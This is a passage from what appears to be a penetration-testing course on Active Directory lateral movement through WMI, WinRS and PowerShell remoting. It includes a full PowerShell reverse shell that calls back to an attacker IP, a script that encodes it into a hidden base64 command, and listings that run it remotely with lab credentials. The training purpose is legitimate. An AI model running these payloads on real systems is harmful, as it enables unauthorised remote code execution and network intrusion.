In this Learning Module, we will cover the following Learning Units:

- Active Directory Lateral Movement Techniques
- Active Directory Persistence

In previous Modules, we located high-value targets that could lead to an Active Directory compromise and found the workstations or servers they are logged in to. We gathered password hashes then recovered and leveraged existing tickets for Kerberos authentication.

Now, we will use lateral movement techniques to compromise the machines on which these high-value domain users are logged in.

A logical next step in our approach would be to crack any password hashes we have obtained and authenticate to a machine with clear text passwords to gain unauthorized access. However, password cracking takes time and may fail. In addition, Kerberos and NTLM do not use the clear text password directly, and native tools from Microsoft do not support authentication using the password hash.

In this Module, we will explore different lateral movement techniques that allow us to authenticate to a system and gain code execution using a user's hash or a Kerberos ticket.

## 24.1. Active Directory Lateral Movement Techniques

This Learning Unit covers the following Learning Objectives:

- Understand WMI, WinRS, and WinRM Lateral Movement Techniques
- Abuse PsExec for Lateral Movement
- Learn about Pass The Hash and Overpass The Hash as Lateral Movement Techniques
- Misuse DCOM to Move Laterally

Lateral Movement is a tactic consisting of various techniques aimed at gaining further access within the target network. As described in the [*MITRE Framework*](https://attack.mitre.org/tactics/TA0008/), these techniques may use the current valid account or reuse authentication material such as password hashes, Kerberos tickets, and application access tokens obtained from the previous attack stages.

In this Learning Unit, we are going to explore various techniques that involve both valid accounts and previously retrieved credentials.

Additionally, it's important to note that the knowledge we've gained about enumerating Active Directory domains remains relevant in the lateral movement attack phase, as we may have acquired access to previously undiscovered networks.

## 24.1.1. WMI and WinRM

The first lateral movement technique we are going to cover is based on [*Windows Management Instrumentation*](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), which is an object-oriented feature that facilitates task automation.

WMI can create processes via the *Create* method from the *Win32\_Process* class. It communicates through [*Remote Procedure Calls*](https://learn.microsoft.com/en-us/windows/win32/rpc/rpc-start-page) (RPC) over port 135 for remote access and uses a higher-range port (19152-65535) for session data.

To demonstrate this attack technique, we'll first briefly showcase the *wmic* utility, which has been [*recently deprecated*](https://docs.microsoft.com/en-us/windows/deployment/planning/windows-10-deprecated-features), and then we'll discover how to conduct the same WMI attack via PowerShell.

To create a process on the remote target via WMI, we need the credentials of a member of the *Administrators* local group, which can also be a domain user. In the following examples, we are going to perform the attacks as the user *jen*, which is both a domain user and a member of the Local Administrator group for the target machines.

We already encountered [*UAC remote restrictions*](https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction#domain-user-accounts-active-directory-user-account) for non-domain joined machines in the *Password Attacks* Module. However, this kind of restriction does not apply to domain users, meaning that we can leverage full privileges while moving laterally with the techniques shown in this Learning Unit.

Historically, wmic has been abused for lateral movement via the command line by specifying the target IP after the **/node:** argument then the user after the **/user:** argument, and then the password after the **/password:** argument.

In this example, we'll instruct **wmic** to launch a calculator, **"calc"** instance with the **process call create** keywords. It is important to note, that the machine we are attacking is a server with the hostname Files04. We are attemping to move laterally from our current machine to this new server.

We can test the command by connecting as *jeff* on CLIENT74.

```fence
C:\Users\jeff>wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
Executing (Win32_Process)->Create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ProcessId = 5772;
        ReturnValue = 0;
};
```

> Listing 1 - Running the wmic utility to spawn a process on a remote system.

The WMI job returned the PID of the newly created process and a return value of "0", meaning that the process has been created successfully.

If we were logged in on that machine and monitoring *Task Manager*, we would see the **win32calc.exe** process appear with *jen* as the user.

Info

System processes and services always run in [*session 0*](https://techcommunity.microsoft.com/t5/ask-the-performance-team/application-compatibility-session-0-isolation/ba-p/372361) as part of session isolation, which was introduced in Windows Vista. Because the WMI Provider Host is running as a system service, the newly created processes through WMI are also spawned in session 0.

Translating this attack into PowerShell syntax requires a few extra details.

First, We need to create a [*PSCredential*](https://docs.microsoft.com/en-us/powershell/scripting/learn/deep-dives/add-credentials-to-powershell-functions?view=powershell-7.2) object that will store our session username and password.

To do that, we will first store the username and password in variables. Then, we will secure the password via the **ConvertTo-SecureString** cmdlet. Finally, we'll create a new PSCredential object with the username variable and **secureString** object.

```fence
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
```

> Listing 2 - Creating the PSCredential object in PowerShell

Now that we have our PSCredential object, we need to create a *Common Information Model* (CIM) via the [*New-CimSession*](https://docs.microsoft.com/en-us/powershell/module/cimcmdlets/new-cimsession?view=powershell-7.2) cmdlet.

To do that, we'll first specify DCOM as the protocol for the WMI session with the **New-CimSessionOption** cmdlet on the first line. On the second line, we'll create the new session, **New-Cimsession** against our target IP, using **\-ComputerName** and supply the PSCredential object (**\-Credential $credential**) along with the session options (**\-SessionOption $Options**). Lastly, we'll define 'calc' as the payload to be executed by WMI.

```fence
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options 
$command = 'calc';
```

> Listing 3 - Creating a new CimSession

As a final step, we need to tie together all the arguments we configured previously by issuing the *Invoke-CimMethod* cmdlet and supplying **Win32\_Process** to the *ClassName* and **Create** to the *MethodName*. To send the argument, we wrap them in **@{CommandLine =$Command}**.

```fence
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

> Listing 4 - Invoking the WMI session through PowerShell

To simulate the technique, we can connect to CLIENT74 as *jeff* and insert the above code in a PowerShell prompt. (Not all the code is shown below.)

```fence
PS C:\Users\jeff> $username = 'jen';
...
PS C:\Users\jeff> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};

ProcessId ReturnValue PSComputerName
--------- ----------- --------------
     3712           0 192.168.50.73
```

> Listing 5 - Executing the WMI PowerShell payload.

Verifying the active processes on the target machine reveals that a new calculator process has been launched, confirming that our attack has succeeded.

![Figure 1: Inspecting The Task Manager](https://static.offsec.com/offsec-courses/PEN-200/imgs/ad_lat_movement/53bbc5aa681c96dbeb7a8a24331a7d39-calc.png)

Figure 1: Inspecting The Task Manager

Info

The PID of win32calc.exe is different from the PID in Listing 1 because the PID in Listing 1 belongs to calc.exe. When the wmic command in Listing 1 runs, it creates the process of calc.exe, which starts another process win32calc.exe, then calc.exe exits, leaving win32calc.exe running.

To further improve our craft, let's replace the previous payload with a full reverse shell written in PowerShell.

First, we'll encode the PowerShell reverse shell, so we don't need to escape any special characters when inserting it as a WMI payload.

The following Python code encodes the PowerShell reverse shell to base64 contained in the *payload* variable and then prints the result to standard output.

Reviewing the entire PowerShell payload is outside the scope of this Module.

We need to replace the highlighted IP and port with the ones of our attacker Kali machine.

```fence
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```

> Listing 6 - Executing the WMI PowerShell payload.

Once we have saved the Python script, we can run it and retrieve the output to use later.

```fence
kali@kali:~$ python3 encode.py
powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAU...
OwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```

> Listing 7 - Running the base64 encoder Python script

After setting up a Netcat listener on port 443 on our Kali machine, we can move on to client74 and run the PowerShell WMI script with the newly generated encoded reverse shell payload.

```fence
PS C:\Users\jeff> $username = 'jen';
PS C:\Users\jeff> $password = 'Nexus123!';
PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

PS C:\Users\jeff> $Options = New-CimSessionOption -Protocol DCOM
PS C:\Users\jeff> $Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options

PS C:\Users\jeff> $Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';

PS C:\Users\jeff> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};

ProcessId ReturnValue PSComputerName
--------- ----------- --------------
     3948           0 192.168.50.73
```

> Listing 8 - Executing the WMI payload with base64 reverse shell

From the output in Listing 8, we can conclude that the process creation has been successful, and switch to our listener for a final confirmation.

```fence
kali@kali:~$ nc -lnvp 443
listening on [any] 443 ...
connect to [192.168.118.2] from (UNKNOWN) [192.168.50.73] 49855

PS C:\windows\system32\driverstore\filerepository\ntprint.inf_amd64_075615bee6f80a8d\amd64> hostname
FILES04

PS C:\windows\system32\driverstore\filerepository\ntprint.inf_amd64_075615bee6f80a8d\amd64> whoami
corp\jen
```

> Listing 9 - Executing the WMI payload with base64 reverse shell

Nice! We indeed managed to move laterally and gain privileges as the *jen* domain user on an internal server by abusing WMI features.

As an alternative method to WMI for remote management, WinRM can be employed for remote host management. WinRM is the Microsoft version of the [*WS-Management*](https://en.wikipedia.org/wiki/WS-Management) protocol and it exchanges XML messages over HTTP and HTTPS. It uses TCP port 5986 for encrypted HTTPS traffic and port 5985 for plain HTTP.

In addition to its PowerShell implementation, which we'll cover later in this section, WinRM is implemented in numerous built-in utilities, such as [*winrs*](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/winrs) (Windows Remote Shell).

For WinRS to work, the domain user needs to be part of the Administrators or Remote Management Users group on the target host.

The winrs utility can be invoked by specifying the target host through the *\-r:* argument and the username with *\-u:* and password with *\-p*. As a final argument, we want to specify the commands to be executed on the remote host. For example, we want to run the hostname and whoami commands to prove that they are running on the remote target.

Since winrs only works for domain users, we'll execute the whole command once we've logged in as *jeff* on CLIENT74 and provide *jen*'s credentials as command arguments.

```fence
C:\Users\jeff>winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"
FILES04
corp\jen
```

> Listing 10 - Executing commands remotely via WinRS

The output confirms that we have indeed executed the commands remotely on FILES04.

To convert this technique into a full lateral movement scenario, we just need to replace the previous commands with the base64 encoded reverse shell we wrote earlier.

```fence
C:\Users\jeff>winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
```

> Listing 11 - Running the reverse-shell payload through WinRS

Once we run the above command after having set up a Netcat listener, we are welcomed with a reverse-shell from FILE04.

```fence
kali@kali:~$ nc -lnvp 443
listening on [any] 443 ...
connect to [192.168.118.2] from (UNKNOWN) [192.168.50.73] 65107
PS C:\Users\jen> hostname
FILES04
PS C:\Users\jen> whoami
corp\jen
```

> Listing 12 - Veriyfing the origin of the WinRS reverse-shell

PowerShell also has WinRM built-in capabilities called [*PowerShell remoting*](https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.2), which can be invoked via the *New-PSSession* cmdlet by providing the IP of the target host along with the credentials in a credential object format similar to what we did previously.

```fence
PS C:\Users\jeff> $username = 'jen';
PS C:\Users\jeff> $password = 'Nexus123!';
PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

PS C:\Users\jeff> New-PSSession -ComputerName 192.168.50.73 -Credential $credential

 Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
 -- ----            ------------    ------------    -----         -----------------     ------------
  1 WinRM1          192.168.50.73   RemoteMachine   Opened        Microsoft.PowerShell     Available
```

> Listing 13 - Establishing a PowerShell Remote Session via WinRM

To interact with the session ID 1 we created, we can issue the **Enter-PSSession** cmdlet followed by the session ID.

```fence
PS C:\Users\jeff> Enter-PSSession 1
[192.168.50.73]: PS C:\Users\jen\Documents> whoami
corp\jen

[192.168.50.73]: PS C:\Users\jen\Documents> hostname
FILES04
```

> Listing 14 - Inspecting the PowerShell Remoting session

Once more, we've proven that the session is originating from the target host through yet another lateral movement technique.

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

| Name  (Click to sort ascending) | IP Address |  |
| --- | --- | --- |
| Lateral Movement in Active Directory - WMI and WinRM - VM Group 1  Start **Lateral Movement in Active Directory - WMI and WinRM - VM Group 1** with Kali browser access |  |  |
| Lateral Movement in Active Directory - WMI and WinRM - VM Group 2  Start **Lateral Movement in Active Directory - WMI and WinRM - VM Group 2** with Kali browser access |  |  |

#### Labs

1. Launch VM Group 1 and repeat the steps discussed in this section. Which PowerShell cmdlet has been used to create a WMI session?

Answer[View hints](https://portal.offsec.com/courses/pen-200-44065/learning/lateral-movement-in-active-directory-47888/#)